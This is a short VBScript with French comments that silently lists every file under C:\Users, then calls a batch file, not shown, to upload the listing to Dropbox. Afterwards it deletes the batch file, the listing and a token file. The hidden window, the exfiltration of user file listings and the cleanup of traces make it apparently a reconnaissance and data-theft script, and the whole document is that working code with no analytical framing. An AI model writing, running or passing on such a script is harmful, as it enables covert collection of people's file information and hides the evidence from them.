' Définir les objets nécessaires
Set objShell = CreateObject("WScript.Shell")

' Définir la commande pour générer l'arborescence
Dim cmd
cmd = "cmd.exe /c tree C:\Users /f /a > arbo.txt"

' Exécuter la commande pour générer l'arborescence
objShell.Run cmd, 0, True

' Attendre 5 secondes (5000 millisecondes) pour s'assurer que le fichier est créé
WScript.Sleep 5000

' Appeler le fichier batch pour envoyer le fichier à Dropbox
objShell.Run "send_to_dropbox.bat", 0, True

' Attendre que le fichier batch ait fini son exécution avant de supprimer
WScript.Sleep 2000 ' Attendre 2 secondes pour être sûr que le batch est terminé

' Supprimer le fichier batch
Set fso = CreateObject("Scripting.FileSystemObject")
fso.DeleteFile "send_to_dropbox.bat"

' Supprimer le fichier arbo.txt
fso.DeleteFile "arbo.txt"

' Supprimer le fichier token.txt
fso.DeleteFile "token.txt"

' Libérer les objets
Set fso = Nothing
Set objShell = Nothing